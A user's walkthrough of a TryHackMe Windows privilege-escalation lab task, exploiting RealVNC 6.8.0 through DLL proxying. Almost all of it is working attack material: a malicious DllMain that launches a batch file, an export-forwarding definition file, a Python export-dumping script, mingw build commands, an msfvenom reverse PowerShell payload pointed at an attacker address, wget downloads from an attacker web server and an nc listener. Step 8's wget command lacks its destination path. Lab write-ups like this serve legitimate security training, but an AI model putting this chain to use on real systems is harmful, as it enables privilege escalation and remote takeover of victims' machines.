writeup by VonKlotz for "Tryhackme.com room Windows Privilege Escalation, Task 7 Abusing vulnerable software Created by  tryhackme and  munra"

Case study: RealVNC 6.8.0

C:\Users\<username>\AppData\Local\Temp\     its our exploit destination
C:\Windows\System32\adsldpc.dll 			its dll we will proxy it need to copy it to our machine
1.bat  										msfvenom -p cmd/windows/reverse_powershell lhost=10.0.0.0 lport=9595 > 1.bat

~~~ FILES ~~~
proxy.c : A standard C implementation of a DLL. The only method implemented will be the DLLMain() function, containing our payload.

@@@@@@@@@@@@@@@@@@@ proxy.c @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
#include <windows.h>

BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH) {
            system("C:\\tools\\1.bat");
    }

    return TRUE;
}
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

proxy.def : A definition file to pass to the linker, where we will specify all of the export forwards back to the original DLL. The structure of the file will hold a line for each export where we will indicate the name of the export, followed by the DLL and method name where the calls will be forwarded, followed by an ordinal that specifies in which position of the export table will the method be:

@@@@@@@@@@@@@@@@@@@@ proxy.def @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
EXPORTS
Method1=C:/Windows/System32/original.dll.Method1 @1
Method2=C:/Windows/System32/original.dll.Method2 @2
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@

get_exports.py : We will then use a slightly modified version of the get_exports.py script from the Cobalt-Strike Github repo.

@@@@@@@@@@@@@@@@@@@@ get_exports.py @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
import pefile
import argparse

parser = argparse.ArgumentParser(description='Target DLL.')
parser.add_argument('--target', required=True, type=str,help='Target DLL')
parser.add_argument('--originalPath', required=True, type=str,help='Original DLL path')

args = parser.parse_args()

target = args.target
original_path = args.originalPath.replace('\\','/')

dll = pefile.PE(target)

print("EXPORTS", end="\r\n")

for export in dll.DIRECTORY_ENTRY_EXPORT.symbols:
    if export.name:
        print(f"    {export.name.decode()}={original_path}.{export.name.decode()} @{export.ordinal}", end="\r\n")
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@


~~~ STEPS ~~~

1. make files above

2. make proxy using command below 

python3 get_exports.py --target adsldpc.dll --originalPath 'C:\Windows\System32\adsldpc.dll' > proxy.def

3. command bellow will compile proxy.c with the -c option, which won't run the linker and produce a proxy.o object file.

x86_64-w64-mingw32-gcc -m64 -c -Os proxy.c -Wall -shared -masm=intel

4. command bellow will take the proxy.o file and run it through the linker, which will also receive the proxy.def file with all of the exports we need for our proxy DLL. As a result, we will end up with the proxy.dll file we need to exploit RealVNC. Feel free to run get_exports.py into the new file to confirm it contains all the exports in the original DLL

x86_64-w64-mingw32-gcc -shared -m64 -def proxy.def proxy.o -o proxy.dll

5. create our payload 1.bat using msfvenom command bellow

msfvenom -p cmd/windows/reverse_powershell lhost=10.0.0.0 lport=9595 > 1.bat

6. start server on our machine command bellow in directory with files

python3 -m http.server 80

7. run powershell and download our dll to C:\Users\thm-unpriv\AppData\Local\Temp\adsldpc.dll  we can use command bellow

wget http://10.0.0.0:80/proxy.dll -O C:\Users\thm-unpriv\AppData\Local\Temp\adsldpc.dll

8. in powershell download 1.bat (our rev shell payload) use command bellow

wget http://10.0.0.0:80/1.bat -O 

9. start listener on attaking machine can use command bellow

nc -lvnp 9595

10.run add and remove programs, click modify then choose repair and run it

~~~ ENJOY ~~~ 
